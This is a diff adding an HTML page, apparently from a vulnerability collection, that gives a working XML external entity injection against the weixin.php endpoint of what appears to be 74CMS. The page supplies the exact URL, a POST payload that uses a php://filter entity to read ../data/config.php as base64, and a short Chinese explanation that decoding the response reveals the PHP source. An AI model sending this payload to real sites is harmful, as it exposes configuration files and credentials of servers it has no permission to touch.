@@ -1,0 +1,29 @@
+<meta charset="UTF-8">
+<div>
+    <h3>XML实体注入 URL: </h3>
+    <ul>
+        <p>/plus/weixin.php?signature=da39a3ee5e6b4b0d3255bfef95601890afd80709&timestamp=&nonce=</p>
+    </ul>
+    <h3>POST-payload: </h3>
+    <pre>
+        <code>
+Content-Type: text/xml
+&lt;?xml version="1.0" encoding="utf-8"?>
+&lt;!DOCTYPE copyright [
+&lt;!ENTITY test SYSTEM "php://filter/read=convert.base64-encode/resource=../data/config.php">
+]>
+&lt;xml>
+&lt;ToUserName>&test;&lt;/ToUserName>
+&lt;FromUserName>1111&lt;/FromUserName>
+&lt;Content>2222&lt;/Content>
+&lt;Event>subscribe&lt;/Event>
+&lt;/xml>
+        </code>
+    </pre>
+    <h3>验证过程</h3>
+    <p>构造post请求</p>
+    <img src="/vulns/imgs/74CMS_0009.webp">
+    <p>打出php内容是base64编码，我们在解码即可得到php源码内容</p>
+    <img src="/vulns/imgs/74CMS_0009_2.webp">
+
+</div>
